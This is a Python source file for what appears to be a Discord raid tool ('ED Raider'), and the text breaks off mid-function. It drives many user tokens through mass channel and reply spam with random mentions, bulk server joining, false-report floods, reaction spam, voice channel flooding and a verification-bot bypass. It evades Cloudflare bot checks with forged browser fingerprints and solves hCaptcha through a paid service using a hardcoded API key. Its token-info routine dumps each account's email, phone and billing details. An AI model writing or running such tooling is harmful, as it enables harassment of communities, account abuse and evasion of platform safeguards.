import time
import threading
import os
import random
import discum as discum
from datetime import datetime
import requests
import threading
import emoji as eeemj
import json
from capmonster_python import HCaptchaTask
from anticaptchaofficial.hcaptchaproxyless import hCaptchaProxyless
from concurrent.futures import ThreadPoolExecutor
import tls_client
import re
import websocket
import base64
import urllib
import httpx
import data.rpc
from time import mktime
import sys
from colorama import Fore

from halo import Halo
import re
import binascii
import tls_client

token_file = input("Token File Name(.txtは消す) >> ")
print("Set: "+token_file+".txt :)")
time.sleep(1)

def Spinner():
	l = ['|', '/', '-', '\\', ' ']
	for i in l+l+l:
		sys.stdout.write(f"""\r {i}""")
		sys.stdout.flush()
		time.sleep(0.1)

kusi = None
def bypass(token, guildid, session):
    headers = get_headers()
    headers["Authorization"] = token
    proxies = get_proxies()[0]
    try:
        payload = session.get(f"https://discord.com/api/v9/guilds/{guildid}/member-verification?with_guild=false", headers=headers, proxy=proxies).json()
        req = session.put(f"https://discord.com/api/v9/guilds/{guildid}/requests/@me", headers=headers, json=payload, proxy=proxies)
        if req.status_code == 201:
            print("Bypassed")
            return
        else:
            print(f"Bypass失敗;;")
            return
    except Exception as err:
        print(f"例外が発生しました。")
def get_channels(tokens,guildid):
    while True:
        headers = get_headers()
        headers["authorization"] = tokens
        channels = []
        session = get_session()
        proxy = get_proxies()
        req = session.get(f"https://discord.com/api/v9/guilds/{guildid}/channels", headers=headers)
        if req.status_code == 200:
            for channel in req.json():
                if 'bitrate' not in channel and channel['type'] == 0:
                    if channel not in channels:
                        channels.append(channel["id"])
            return channels
            break
        else:
            continue
def get_messages(tokens,channel_id):
    while True:
        headers = get_headers()
        headers["authorization"] = tokens
        messages = []
        session = get_session()
        proxy = get_proxies()
        req = session.get(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=headers)
        if req.status_code == 200:
            for message in req.json():
                if 'bitrate' not in message and message['type'] == 0:
                    if message not in messages:
                        messages.append(message["id"])
            return messages
            break
        else:
            continue

def getheaders(token=None):
    headers = random.choice(heads)
    if token:
        headers.update({"Authorization": token})
    return headers

heads = [
    {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:76.0) Gecko/20100101 Firefox/76.0'
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/72.0"
    },

    {
        "Content-Type": "application/json",
        'User-Agent': 'Mozilla/5.0 (Windows NT 3.1; rv:76.0) Gecko/20100101 Firefox/69.0'
    },

    {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (X11; Debian; Linux x86_64; rv:72.0) Gecko/20100101 Firefox/76.0"
    },

    {
       "Content-Type": "application/json",
       "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"
    }
]

def Info(token):
    r = requests.get('https://discord.com/api/v9/users/@me', headers=getheaders(token))
    cc_digits = {
    'american express': '3',
    'visa': '4',
    'mastercard': '5'
}
    badges = ""

    Discord_Employee = 1
    Partnered_Server_Owner = 2
    HypeSquad_Events = 4
    Bug_Hunter_Level_1 = 8
    House_Bravery = 64
    House_Brilliance = 128
    House_Balance = 256
    Early_Supporter = 512
    Bug_Hunter_Level_2 = 16384
    Early_Verified_Bot_Developer = 131072

    flags = r.json()['flags']
    if (flags == Discord_Employee):
        badges += "スタッフ"
    if (flags == Partnered_Server_Owner):
        badges += "パートナーサーバーのオーナー"
    if (flags == HypeSquad_Events):
        badges += "Hypesquadイベント"
    if (flags == Bug_Hunter_Level_1):
        badges += "バグハンター(Green,level1)"
    if (flags == House_Bravery):
        badges += "Hypesquad Bravery, "
    if (flags == House_Brilliance):
        badges += "HypeSquad Brillance, "
    if (flags == House_Balance):
        badges += "HypeSquad Balance, "
    if (flags == Early_Supporter):
        badges += "早期サポーター"
    if (flags == Bug_Hunter_Level_2):
        badges += "バグハンター(gold,level2)"
    if (flags == Early_Verified_Bot_Developer):
        badges += "認証BOTのDeveloper "
    if (badges == ""):
        badges = "無し"

    userName = r.json()['username'] + '#' + r.json()['discriminator']
    userID = r.json()['id']
    phone = r.json()['phone']
    email = r.json()['email']
    language = r.json()['locale']
    mfa = r.json()['mfa_enabled']
    avatar_id = r.json()['avatar']
    has_nitro = False
    res = requests.get('https://discordapp.com/api/v9/users/@me/billing/subscriptions', headers=getheaders(token))
    nitro_data = res.json()
    has_nitro = bool(len(nitro_data) > 0)
    avatar_url = f'https://cdn.discordapp.com/avatars/{userID}/{avatar_id}.webp'
    cREAtion_date = datetime.utcfromtimestamp(((int(userID) >> 22) + 1420070400000) / 1000).strftime("%Y/%m/%d %H:%M:%S")

    if has_nitro:
        d1 = datetime.strptime(nitro_data[0]["current_period_end"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
        d2 = datetime.strptime(nitro_data[0]["current_period_start"].split('.')[0], "%Y-%m-%dT%H:%M:%S")
        days_left = abs((d2 - d1).days)

    billing_info = []
    for x in requests.get('https://discordapp.com/api/v9/users/@me/billing/payment-sources', headers=getheaders(token)).json():
        y = x['billing_address']
        name = y['name']
        address_1 = y['line_1']
        address_2 = y['line_2']
        city = y['city']
        postal_code = y['postal_code']
        state = y['state']
        country = y['country']
        if x['type'] == 1:
            cc_brand = x['brand']
            cc_first = cc_digits.get(cc_brand)
            cc_last = x['last_4']
            cc_month = str(x['expires_month'])
            cc_year = str(x['expires_year'])
            data = {
                'Payment Type': 'Credit Card',
                'Valid': not x['invalid'],
                'CC Holder Name': name,
                'CC Brand': cc_brand.title(),
                'CC Number': ''.join(z if (i + 1) % 2 else z + ' ' for i, z in enumerate((cc_first if cc_first else '*') + ('*' * 11) + cc_last)),
                'CC Exp. Date': ('0' + cc_month if len(cc_month) < 2 else cc_month) + '/' + cc_year[2:4],
                'Address 1': address_1,
                'Address 2': address_2 if address_2 else '',
                'City': city,
                'Postal Code': postal_code,
                'State': state if state else '',
                'Country': country,
                'Default Payment': x['default']
            }
        elif x['type'] == 2:
            data = {
                'Payment Type': 'PayPal',
                'Valid': not x['invalid'],
                'PayPal Name': name,
                'PayPal Email': x['email'],
                'Address 1': address_1,
                'Address 2': address_2 if address_2 else '',
                'City': city,
                'Postal Code': postal_code,
                'State': state if state else '',
                'Country': country,
                'Default Payment': x['default']
            }
        billing_info.append(data)
        
    print(f'''
{Fore.RESET}{Fore.LIGHTMAGENTA_EX} アカウント {Fore.RESET}
[{Fore.GREEN}ユーザーネーム{Fore.RESET}]    {userName} | {userID}
[{Fore.GREEN}バッジ{Fore.RESET}]           {badges}
[{Fore.GREEN}言語{Fore.RESET}]             {language}
[{Fore.GREEN}作成日時{Fore.RESET}]         {cREAtion_date}
[{Fore.GREEN}アバターURL{Fore.RESET}]      {avatar_url if avatar_id else ""}
[{Fore.GREEN}Token{Fore.RESET}]   {Fore.RED}{token}{Fore.RESET}

{Fore.RESET}{Fore.LIGHTMAGENTA_EX} セキュリティ {Fore.RESET}
[{Fore.GREEN}Eメール{Fore.RESET}]     {email}
[{Fore.GREEN}電話番号{Fore.RESET}]    {phone if phone else "無し"}
[{Fore.GREEN}二段階認証{Fore.RESET}]  {mfa}

{Fore.RESET}{Fore.LIGHTMAGENTA_EX} Nitro {Fore.RESET}
[{Fore.GREEN}Nitro 情報{Fore.RESET}]    {has_nitro}
[{Fore.GREEN}Nitroの終了まで{Fore.RESET}]  {days_left if has_nitro else "0"}日
            ''')
    if len(billing_info) > 0:
        print(f"{Fore.RESET}{Fore.LIGHTMAGENTA_EX} 請求情報 {Fore.RESET}")
        if len(billing_info) == 1:
            for billing in billing_info:
                for key,val in billing.items():
                    if not val:
                        continue
                    print(f"[{Fore.RED}"+'{:<23}{:<10}{}'.format(key+Fore.RED+Fore.RESET+"]", Fore.RESET, val))
        else:
            for i, x in enumerate(billing_info):
                title = f'支払い情報 #{i + 1} ({x[""]})'
                print('' + title)
                print('' + ('=' * len(title)))
                for j, (key, val) in enumerate(x.items()):
                    if not val or j == 0:
                        continue
                    print(f"[{Fore.RED}"+'{:<23}{:<10}{}'.format(key+Fore.RED+Fore.RESET+"]", Fore.RESET, val))
                if i < len(billing_info) - 1:
                    print(f'{Fore.RESET}')
        print(f'{Fore.RESET}')
    input(f'[\x1b[95m>\x1b[95m\x1B[37m] ENTERを入力してください: ')
        
def get_proxies():
    """Proxies"""
    global kusi
    return None, None
    #else:
    #    proxy = random.choice(kusi)
    #    proxy_tlsclient = {"http": "http://" + proxy, "https": "https://" + proxy}
    #    if "@" in proxy:
    #        uspw = proxy[proxy.find("@")+1:]
    #        ip = proxy[:proxy.find(":")]
    #        port = proxy[proxy.find(":")+1:proxy.find("@")]
    #        user = uspw[:uspw.find(":")]
    #        passwordd = uspw[uspw.find(":")+1:]
    #    else:
    #        ip = proxy[:proxy.find(":")]
    #        port = proxy[proxy.find(":")+1:]
    #        user = None
    #        passwordd = None
    #    proxy_ws = {
    #        "http_proxy_host": ip,
    #        "http_proxy_port": port,
    #        "proxy_type": "https",
    #        "http_proxy_auth": [
    #            user,
    #            passwordd
    #        ]
    #    }
    #    return proxy_tlsclient, proxy_ws
def get_session():
    session = tls_client.Session(client_identifier="chrome_105")
    headers = {
        "Pragma": "no-cache",
        "Accept": "*/*",
        "Content-Type": "application/json",
        "Accept-Language": "en-US",
        "Accept-Encoding": "gzip, deflate",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36",
        "X-Debug-Options": "bugReporterEnabled",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin"
    }
    reeq = session.get("https://discord.com/", headers=headers)
    html = reeq.text
    r = str(re.findall(r"r:'[^']*'", html)[0]).replace("r:'", "").replace("'", "")
    m = str(re.findall(r"m:'[^']*'", html)[0]).replace("m:'", "").replace("'", "")
    payload = {
        "m": m,  # __CF$cv$params
        "results": [
            str(binascii.b2a_hex(os.urandom(16)).decode('utf-8')),
            str(binascii.b2a_hex(os.urandom(16)).decode('utf-8'))
        ],
        "timing": random.randint(40, 120),  # Execution time
        "fp": {
            "id": 3,
            "e": {
                "r": [
                    1920,  # Height
                    1080   # Width
                ],
                "ar": [
                    1040,  # availHeight
                    1920   # availWidth
                ],
                "pr": 1,      # Pixel Ratio
                "cd": 24,     # Color Depth
                "wb": False,  # Web-driver
                "wp": False,  # PhantomCall
                "wn": False,  # NightMare
                "ch": True,   # Chrome
                "ws": False,  # Selenium
                "wd": False   # domAutomation
            }
        }
    }
    headers["content-type"] = "application/json"
    session.post(f'https://discord.com/cdn-cgi/challenge-platform/h/b/cv/result/{r}', headers=headers, json=payload)
    return session

def get_headers(option=None):
    headers = {
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
        "Accept-language": "en-US",
        "Content-Type": "application/json",
        "Accept-Encoding": "gzip, deflate",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-origin"
    }
    xxx = {
        "os": "Windows",
        "browser": "Chrome",
        "device": "",
        "system_locale": "en-US",
        "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36",
        "browser_version": "107.0.0.0",
        "os_version": "10",
        "referrer": "",
        "referring_domain": "",
        "referrer_current": "",
        "referring_domain_current": "",
        "release_channel": "stable",
        "client_build_number": 160996,
        "client_event_source": None
    }
    headers["x-super-properties"] = base64.b64encode(json.dumps(xxx, separators=(',', ':')).encode()).decode()
    return headers
class Color:
	BLACK          = '\033[30m'#(文字)黒
	RED            = '\033[31m'#(文字)赤
	GREEN          = '\033[32m'#(文字)緑
	YELLOW         = '\033[33m'#(文字)黄
	BLUE           = '\033[34m'#(文字)青
	MAGENTA        = '\033[35m'#(文字)マゼンタ
	CYAN           = '\033[36m'#(文字)シアン
	WHITE          = '\033[37m'#(文字)白
	COLOR_DEFAULT  = '\033[39m'#文字色をデフォルトに戻す
	BOLD           = '\033[1m'#太字
	UNDERLINE      = '\033[4m'#下線
	INVISIBLE      = '\033[08m'#不可視
	REVERCE        = '\033[07m'#文字色と背景色を反転
	BG_BLACK       = '\033[40m'#(背景)黒
	BG_RED         = '\033[41m'#(背景)赤
	BG_GREEN       = '\033[42m'#(背景)緑
	BG_YELLOW      = '\033[43m'#(背景)黄
	BG_BLUE        = '\033[44m'#(背景)青
	BG_MAGENTA     = '\033[45m'#(背景)マゼンタ
	BG_CYAN        = '\033[46m'#(背景)シアン
	BG_WHITE       = '\033[47m'#(背景)白
	BG_DEFAULT     = '\033[49m'#背景色をデフォルトに戻す
	RESET          = '\033[0m'#全てリセット
class COLOR:
    LIGHTBLUE_EX=Fore.LIGHTBLUE_EX
    LIGHTBLACK_EX=Fore.LIGHTBLACK_EX 
    LIGHTMAGENTA_EX=Fore.LIGHTMAGENTA_EX
    LIGHTRED_EX=Fore.LIGHTRED_EX
    LIGHTCYAN_EX=Fore.LIGHTCYAN_EX
    LIGHTWHITE_EX=Fore.LIGHTWHITE_EX
    LIGHTGREEN_EX=Fore.LIGHTGREEN_EX
    LIGHTYELLOW=Fore.LIGHTYELLOW_EX    
def clear_screen():
    if os.name == 'posix':
        _ = os.system('clear')
    else:
        # It is for Windows platfrom
        _ = os.system('cls')

import string
def randomname(n):
        randlst = [random.choice(string.ascii_letters + string.digits) for i in range(n)]
        return ''.join(randlst)

def solvecaptcha(sitekey, rqdata, useragent):
        capmonster = HCaptchaTask("29d9da5d6d5b2395107101482b9877d6")
        capmonster.set_user_agent(useragent)
        task_id = capmonster.create_task(website_url="https://discord.com", website_key=sitekey, custom_data=rqdata)
        result = capmonster.join_task_result(task_id)
        aaa = result.get("gRecaptchaResponse")
        print(f"Captcha Bypass")
        return aaa
def menu():
    clear_screen()
    print(Color.GREEN+"""
      _____ ____            _     _           
     | ____|  _ \ _ __ __ _(_) __| | ___ _ __ 
     |  _| | | | | '__/ _` | |/ _` |/ _ \ '__|
     | |___| |_| | | | (_| | | (_| |  __/ |   
     |_____|____/|_|  \__,_|_|\__,_|\___|_|   
    
        | Made By cocoapc911 Modify By ☆にゃにゃっこ☆
        | Discord: ここあ#0001 ☆にゃにゃっこ☆#5964
        | Github: https://github.com/HACKShinn1204/Ghost-Raider
        | Skid List: Ghost Raider, Ghost Checker, auau Raider
        | Version: 0.01.46
    """+Color.RESET)
    print(COLOR.LIGHTBLUE_EX+"""

      [01] Spammer                      [02] Joiner                   [03] Report Spam            [04] Ghost Spam         

      [05] HypeSquad Change             [06] Form(Threads) Creater    [07] Leaver                 [08] Reaction Spammer

      [09] Nickname Changer             [10] Yax Bot Verify Bypasser  [11] Reply Spammer          [12] VC Joiner        
            
      [13] Token Checker                [14] Token Status             [15] Token Info             [99] More..

    """+Color.RESET)
    modes = input("Mode >> ")
    if modes == "1":
        spam_mode = input(f"[1]{Fore.GREEN}All Channel{Fore.RESET}\n[2]{Fore.GREEN}Normal Channel{Fore.RESET}\nMode >> ")
        if spam_mode == "1":
            global randomname
            ffs = open('message.txt',"r",encoding="utf-8_sig")
            messages = ffs.read()
            guild_id  = input("Server Id >> ")
            channel_id = input("Channel id >> ") 
            token = input("Token >> ")
            messageselect = input(f"{Fore.GREEN}yes=y{Fore.RESET} {Fore.RED}no=n{Fore.RESET}\nファイルのメッセージを読み込みますか？ >> ")
            if messageselect == "y":
                ffs = open('message.txt',"r",encoding="utf-8_sig")
                messages = ffs.read()
            if messageselect == "n":
                messages = input("Message >> ")                
            randomcount = int(input("Random length >> "))    
            chlist = get_channels(token,int(guild_id))
            randoms = int(input("Random Mention数(しない場合0と入力) >> "))
            if randoms > 0:
                tokens = token
                bot = discum.Client(token=tokens, log=False)
                def close_after_fetching(resp, guild_id):
                    if bot.gateway.finishedMemberFetching(guild_id):
                        bot.gateway.removeCommand({
                            'function': close_after_fetching,
                            'params': {
                                'guild_id': guild_id
                            }
                        })
                        bot.gateway.close()

                def get_members(guild_id, channel_id):
                    bot.gateway.fetchMembers(
                        guild_id, channel_id, keep="all",
                        wait=1)  #get all user attributes, wait 1 second between requests
                    bot.gateway.command({
                        'function': close_after_fetching,
                        'params': {
                            'guild_id': guild_id
                        }
                    })
                    bot.gateway.run()
                    bot.gateway.resetSession()  #saves 10 seconds when gateway is run again
                    return bot.gateway.session.guild(guild_id).members
                members = get_members(guild_id, channel_id)
                memberslist = []
                for memberID in members:
                    print(f"メンバーを取得しました。{memberID}")
                    memberslist.append(memberID)      
                def memberspam():
                    spams = ""
                    with open(token_file + '.txt') as f:
                            lines = f.readlines()
                            while True:
                                for l in lines:
                                        channel_id = random.choice(chlist)
                                        for _ in range(randoms):
                                            spams += "<@" + random.choice(memberslist) + "> "
                                        randomed = randomname(randomcount)
                                        payload = {"content": f"{messages}\n{spams}\n" + randomed}
                                        headers = {"authorization": l.rstrip("\n")}
                                        res = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=headers, json=payload)
                                        spams = ""
                                        print("Send: "+randomed)

                                
                while True:
                    time.sleep(0.7)
                    threading.Thread(target=memberspam).start()
            else:
                def normalspam():
                    with ThreadPoolExecutor(max_workers=4) as executor:
                        with open(token_file + '.txt') as f:
                            lines = f.readlines()
                            while True:
                                for l in lines:
                                    randoms = randomname(randomcount)
                                    try:
                                        channel_id = random.choice(chlist)
                                        payload = {"content": f"{messages}\n"+randoms}
                                        headers = {"authorization": l.rstrip("\n")}
                                        res = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=headers, json=payload)
                                        spams = ""
                                        print("Send: "+randoms)
                                    except Exception as e:
                                        print("Error: "+ e)          
                while True:
                    time.sleep(0.4)
                    threading.Thread(target=normalspam).start()      
        if spam_mode == "2":
            channel_id = input("Channel id >> ")    
            messageselect = input(f"{Fore.GREEN}yes=y{Fore.RESET} {Fore.RED}no=n{Fore.RESET}\nファイルのメッセージを読み込みますか？ >> ")
            if messageselect == "y":
                ffs = open('message.txt',"r",encoding="utf-8_sig")
                messages = ffs.read()
            if messageselect == "n":
                messages = input("Message >> ")       
            randomcount = int(input("Random length >> "))                 
            randoms = int(input("Random Mention数(しない場合0と入力) >> "))
            if randoms > 0:
                tokens = input("Input Token >> ")
                guild_id = input("Server Id >> ")
                bot = discum.Client(token=tokens, log=False)
                def close_after_fetching(resp, guild_id):
                    if bot.gateway.finishedMemberFetching(guild_id):
                        bot.gateway.removeCommand({
                            'function': close_after_fetching,
                            'params': {
                                'guild_id': guild_id
                            }
                        })
                        bot.gateway.close()
    
                def get_members(guild_id, channel_id):
                    bot.gateway.fetchMembers(
                        guild_id, channel_id, keep="all",
                        wait=1)  #get all user attributes, wait 1 second between requests
                    bot.gateway.command({
                        'function': close_after_fetching,
                        'params': {
                            'guild_id': guild_id
                        }
                    })
                    bot.gateway.run()
                    bot.gateway.resetSession()  #saves 10 seconds when gateway is run again
                    return bot.gateway.session.guild(guild_id).members
                members = get_members(guild_id, channel_id)
                memberslist = []
                for memberID in members:
                    print(f"メンバーを取得しました。{memberID}")
                    memberslist.append(memberID)      
                def memberspam():
                    spams = ""
                    with open(token_file + '.txt') as f:
                            lines = f.readlines()
                            while True:
                                for l in lines:
                                        for _ in range(randoms):
                                            spams += "<@" + random.choice(memberslist) + "> "
                                        randomed = randomname(randomcount)
                                        payload = {"content": f"{messages}\n{spams}\n" + randomed}
                                        headers = {"authorization": l.rstrip("\n")}
                                        res = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=headers, json=payload)
                                        spams = ""
                                        print("Send: "+randomed)

                                
                while True:
                    time.sleep(0.7)
                    threading.Thread(target=memberspam).start()
            else:
                def normalspam():
                    with ThreadPoolExecutor(max_workers=4) as executor:
                        with open(token_file + '.txt') as f:
                            lines = f.readlines()
                            while True:
                                for l in lines:
                                    randoms = randomname(randomcount)
                                    try:
                                        payload = {"content": f"{messages}\n"+randoms}
                                        headers = {"authorization": l.rstrip("\n")}
                                        res = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages", headers=headers, json=payload)
                                        spams = ""
                                        print("Send: "+randoms)
                                    except Exception as e:
                                        print("Error: "+ e)          
            while True:
                time.sleep(0.4)
                threading.Thread(target=normalspam).start()                                
    if modes == "2":
        invid = input("Invite Code >> ")
        rule = input("RuleScreen y/n >> ")
        def join():
            with open(token_file + '.txt') as f:
                lines = f.readlines()
                for l in lines:
                    print("start")
                    token = l.rstrip("\n")
                    session = get_session()
                    proxies = get_proxies()[0]
                    headers = get_headers()
                    headers["Referer"] = "https://discord.com/invite/" + invid
                    headers["x-context-properties"] = "eyJsb2NhdGlvbiI6IkFjY2VwdCBJbnZpdGUgUGFnZSJ9"
                    headers["authorization"] = token
                    
                    session.get("https://discord.com/api/v9/experiments?with_guild_experiments=true", headers=headers, proxy=proxies)
                    
                    del headers["x-context-properties"]
                    
                    xcreq = session.get("https://discord.com/api/v9/invites/" + invid + "?with_counts=true&with_expiration=true", headers=headers, proxy=proxies).json()
                    
                    chid = xcreq["channel"]["id"]
                    guildid = xcreq["guild"]["id"]
                    chtype = xcreq["channel"]["type"]
                    xxx = {
                        "location": "Accept Invite Page",
                        "location_guild_id": str(guildid),
                        "location_channel_id": str(chid),
                        "location_channel_type": str(chtype) 
                    }
                    headers["x-context-properties"] = base64.b64encode(json.dumps(xxx, separators=(',', ':')).encode()).decode()
                    try:
                            joinreq = session.post(f"https://discord.com/api/v9/invites/{invid}", headers=headers, json={})
                            if "captcha_key" not in joinreq.json():
                                if "You need to verify your account in order to perform this action." in joinreq.json():
                                    print(f"{token}は死亡しています。")
                                print(f"参加しました。")
                                if rule == "y":
                                    bypass(token, guildid, session)
                            if "captcha_key" in joinreq.json():
                                wsitekey = joinreq.json()['captcha_sitekey']
                                print(f"キャプチャーに検出されました。")
                                crqdata = joinreq.json()["captcha_rqdata"]
                                captchakey = solvecaptcha(sitekey=wsitekey, rqdata=crqdata, useragent=headers["user-agent"])
                                captcha_rqtoken = joinreq.json()["captcha_rqtoken"]
                                payload = {'captcha_key': captchakey, 'captcha_rqtoken': captcha_rqtoken}
                                joinreq2 = session.post(f"https://discord.com/api/v9/invites/{invid}", headers=headers, json=payload)
                                if joinreq2.status_code == 200:
                                    print(f"参加完了")
                                    if option == "y":
                                        bypass(token, guildid, session)
                                else:
                                    print(f"参加失敗")
                                    #continue
                    except Exception as err:
                            print(f"エラーが発生しました。")
        with ThreadPoolExecutor(max_workers=4) as executor:
            executor.submit(join)

    if modes == "3":
        channel_id = input("Channel Id >> ")
        message_id = input("Message Id >>")
        with open(token_file + '.txt') as f:
            lines = f.readlines()
            while True:
                for l in lines:
                    try:
                        payload = {"version":"1.0","variant":"3","language":"en","breadcrumbs":[3,14,52],"elements":{},"name":"message","channel_id":f"{channel_id}","message_id":f"{message_id}"}
                        headers = {"authorization": l.rstrip("\n")}
                        res = requests.post(f"https://discord.com/api/v9/reporting/message", headers=headers, json=payload)
                        print(l.rstrip("\n"))
                        print(res.text)
                    except Exception as e:
                        print("Error: "+ e) 
    if modes == "7":
        guild = input("Server Id >> ")
        with open(token_file + '.txt') as f:
            lines = f.readlines()
            for l in lines:
                try:
                    headers = {"authorization": l.rstrip("\n")}
                    res = requests.delete(f"https://discord.com/api/v9/users/@me/guilds/{guild}", headers=headers)
                except:
                        print("エラーが発生しました。") 
    if modes == "8":
        reaction_mode = input(f"[1]{Fore.GREEN}All Messages{Fore.RESET}\n[2]{Fore.GREEN}One Messages{Fore.RESET}\nMode >> ")
        if reaction_mode == "2":
            emoji = input("emoji >> ")
            channel_id = input("Channel Id >> ")
            message_id = input("Message Id >> ")
            with open(token_file + '.txt') as f:
                lines = f.readlines()
                for l in lines:
                    try:
                        emojii = eeemj.emojize(emoji, language='alias')
                        emojiaa = urllib.parse.quote(emojii)
                        headers = {"authorization": l.rstrip("\n")}
                        req = requests.put(f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{emojiaa}/%40me", headers=headers)
                    except:
                        print("Error")
        if reaction_mode == "1":
                token = input("Token >> ")
                emoji = input("emoji >> ")
                channel_id = input("Channel Id >> ")
                mslist = get_messages(token,int(channel_id))
                tokens = token
                with open(token_file + '.txt') as f:
                    lines = f.readlines()
                    while True:
                        for l in lines:
                            try:
                                message_id = random.choice(mslist)
                                emojii = eeemj.emojize(emoji, language='alias')
                                emojiaa = urllib.parse.quote(emojii)
                                message_id = random.choice(mslist)
                                headers = {"authorization": l.rstrip("\n")}
                                req = requests.put(f"https://discord.com/api/v9/channels/{channel_id}/messages/{message_id}/reactions/{emojiaa}/%40me", headers=headers)
                            except Exception as e:
                                print("Error: "+ e)       
    if modes == "10":
        url = input("Verify URL >> ")
        with open(token_file + '.txt') as f:
                lines = f.readlines()

                for l in lines:
                    try:
                        if "yax.life" in url:
                            session = requests.Session()
                            session.get("https://discord.com", headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"})
                            payload = {"authorize": True,"permissions": "0"}
                            headers = {"authorization":l.rstrip("\n"),"content-type":"application/json","user-agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9010 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36"}
                            req = session.post(url,headers=headers,json=payload)
                            js = req.json()
                            print(js["location"])
                            headers = {"user-agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9010 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36"}
                            session.get(js["location"],headers=headers)
                            #https://discord.com/oauth2/authorize?client_id=841539874577317888&response_type=code&redirect_uri=https%3A%2F%2Flisxck.fyi%2Fdiscord%2Fcallback&scope=identify%20email%20guilds%20guilds.join&state=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJrZXkiOiJ1b2cycnhiNWhteDUiLCJndWlsZCI6IjEwNTQyNDc0ODIzMzIzMDMzNjAiLCJyb2xlIjoiMTA1NDI0NzQ4MjM2NTg1Mzc2NyIsImlhdCI6MTY3Mzk0NDQ1M30.9AptgyMV9-yh-C3Ot1s7ZKU1jZVOc1BT1R3DeP4y5M8  
                            #https://discord.com/api/oauth2/authorize?client_id=928991239192346634&redirect_uri=https://yax.life/api/callback/&response_type=code&scope=identify%20guilds.join&state=1038424665313525850
                        elif "kodai0417" in url:
                            session = requests.Session()
                            session.get("https://discord.com", headers={"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36"})
                            payload = {"authorize": True,"permissions": 0}
                            headers = {"authorization":l.rstrip("\n"),"content-type":"application/json","user-agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9010 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36"}
                            req = session.post(url,headers=headers,json=payload)
                            js = req.json()
                            print(js["location"])
                            headers = {"user-agent":"Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/1.0.9010 Chrome/91.0.4472.164 Electron/13.6.6 Safari/537.36"}
                            yr = session.get(js["location"],headers=headers)                            
                            print(yr.text)
                    except:
                        print("Token死んでるかも")
                menu()
    if modes == "11":
        guild_id = input("Server Id >> ")
        channel_id = input("Channel Id >> ")
        message_id = input("Message Id >>")
        message_select = input("Message Load? y/n>> ")
        if message_select == "y":
            ffs = open('message.txt',"r",encoding="utf-8_sig")
            messages = ffs.read()
        if message_select == "n":
            messages = input("Message >> ")    
        def reply():
            with open(token_file + '.txt') as f:
                lines = f.readlines()
                while True:
                    for l in lines:
                            try:
                                randoms = randomname(10)
                                payload = {"content":f"{messages}\n"+randoms,"message_reference":{"guild_id":f"{guild_id}","channel_id":f"{channel_id}","message_id":f"{message_id}"}}
                                headers = {"authorization":l.rstrip("\n")}
                                req = requests.post(f"https://discord.com/api/v9/channels/{channel_id}/messages",headers=headers,json=payload)
                            except:
                                print("失敗！")
        while True:
            time.sleep(0.2)
            threading.Thread(target=reply).start()
    if modes == "12":
        guild_id = input("Server Id >> ")
        channel_id = input("Voice Channel Id >> ")
        def join(token):
            ws = websocket.WebSocket()
            ws.connect("wss://gateway.discord.gg/?encoding=json&v=9")
            ws.send(json.dumps({
                "op":2,
                    "d": {
                        "token": token,
                        "properties": {
                            "$os": "Discord Android",
                            "$browser": "Discord Android",
                            "$device": "Discord Android",
                        },
                        "presence": {
                            "game": {
                                "name": "ED Raider"
                            },
                            "status": "online",
                            "since": 0,
                            "activities": [],
                            "afk": False,
                        },
                    },
                    "s": None,
                    "t": None,
            }
                
            )
                    )
            ws.send(
                    json.dumps(
                        {
                            "op": 4,
                            "d": {
                                "guild_id": guild_id,
                                "channel_id": channel_id,
                                "self_mute": False,
                                "self_deaf": True,
                                "self_video": False
                            }
                        }
                    )
            )        
        with open(token_file + '.txt') as f:
            lines = f.readlines()
            for l in lines:    
                tokens = l.rstrip("\n")
                threading.Thread(target=join, args=[tokens]).start()
            menu()             
    if modes == "4":
        messages = input("Messages >> ")
        channel_id = input("Channel Id >>")
        with open(token_file + '.txt') as f:
            lines = f.readlines()
            while True:
                 for l in lines:
                    try:
